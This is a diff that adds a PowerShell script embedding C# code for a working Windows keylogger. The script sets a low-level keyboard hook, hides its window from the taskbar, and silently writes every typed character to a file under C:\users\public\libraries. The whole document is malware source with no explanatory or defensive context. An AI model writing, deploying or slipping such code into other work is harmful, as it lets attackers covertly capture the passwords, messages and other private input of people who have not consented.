@@ -1,0 +1,104 @@
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+using System.IO;
+using System.Text; 
+
+public class KeyLogger : Form {
+    private static StreamWriter sw;
+
+    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+    private static LowLevelKeyboardProc _proc = HookCallback;
+    private static IntPtr _hookID = IntPtr.Zero;
+
+    static KeyLogger() {
+        string logPath = "C:\\users\\public\\libraries\\keylog.txt";
+        Directory.CreateDirectory(Path.GetDirectoryName(logPath));
+        sw = new StreamWriter(logPath, true);
+        sw.AutoFlush = true;
+    }
+
+    public KeyLogger() {
+        this.WindowState = FormWindowState.Minimized;
+        this.ShowInTaskbar = false;
+        this.Load += (s, e) => {
+            _hookID = SetHook(_proc);
+        };
+        this.FormClosing += (s, e) => {
+            UnhookWindowsHookEx(_hookID);
+            sw.Close();
+        };
+    }
+
+    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
+        using (Process curProcess = Process.GetCurrentProcess())
+        using (ProcessModule curModule = curProcess.MainModule) {
+            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
+                GetModuleHandle(curModule.ModuleName), 0);
+        }
+    }
+
+    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
+        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
+            int vkCode = Marshal.ReadInt32(lParam);
+            Keys key = (Keys)vkCode;
+
+            string output = "";
+
+            bool shiftPressed = (Control.ModifierKeys & Keys.Shift) == Keys.Shift;
+            bool capsLockOn = Control.IsKeyLocked(Keys.CapsLock);
+
+            byte[] keyState = new byte[256];
+            GetKeyboardState(keyState);
+
+            if (shiftPressed)
+                keyState[(int)Keys.ShiftKey] = 0x80;
+
+            StringBuilder sb = new StringBuilder(2);
+            int result = ToAscii(vkCode, 0, keyState, sb, 0);
+
+            if (result == 1) {
+                output = sb.ToString();
+		sw.Write(output);
+            }
+        }
+        return CallNextHookEx(_hookID, nCode, wParam, lParam);
+    }
+
+    private const int WH_KEYBOARD_LL = 13;
+    private const int WM_KEYDOWN = 0x0100;
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr SetWindowsHookEx(int idHook,
+        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto)]
+    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
+        IntPtr wParam, IntPtr lParam);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    [DllImport("user32.dll")]
+    private static extern int ToAscii(int uVirtKey, int uScanCode, byte[] lpKeyState,
+        [Out] StringBuilder lpChar, uint flags);
+
+    [DllImport("user32.dll")]
+    private static extern bool GetKeyboardState(byte[] lpKeyState);
+
+    [STAThread]
+    public static void Main() {
+        Application.EnableVisualStyles();
+        Application.SetCompatibleTextRenderingDefault(false);
+        Application.Run(new KeyLogger());
+    }
+}
+"@ -ReferencedAssemblies "System.Windows.Forms","System.Drawing"
+
+[KeyLogger]::Main()
